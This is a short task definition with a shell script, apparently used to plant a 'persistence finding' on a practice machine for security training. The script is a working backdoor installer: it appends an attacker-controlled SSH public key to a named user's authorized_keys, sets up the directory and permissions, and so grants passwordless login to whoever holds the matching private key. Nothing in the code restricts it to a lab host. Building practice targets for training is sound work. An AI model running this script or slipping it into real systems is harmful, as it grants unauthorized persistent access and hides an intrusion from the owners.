name: authorized-keys-persistence
description: Practice-box persistence finding: appends an attacker-controlled SSH public key to a named user's authorized_keys, granting key-based passwordless access to whoever holds the private half. Vars: USERNAME (required, must already exist), PUBLIC_KEY (required, full 'ssh-ed25519 AAAA... comment' line).
script:
#!/bin/sh
set -eu


: "${USERNAME:?USERNAME is required}"
: "${PUBLIC_KEY:?PUBLIC_KEY is required}"

home=$(getent passwd "$USERNAME" | cut -d: -f6)
if [ -z "$home" ]; then
    echo "authorized-keys-persistence: user $USERNAME not found" >&2
    exit 1
fi

install -d -m 0700 "$home/.ssh"
keys="$home/.ssh/authorized_keys"
touch "$keys"
if ! grep -Fq -- "$PUBLIC_KEY" "$keys"; then
    printf '%s\n' "$PUBLIC_KEY" >> "$keys"
fi
chmod 0600 "$keys"
chown -R "$USERNAME" "$home/.ssh"
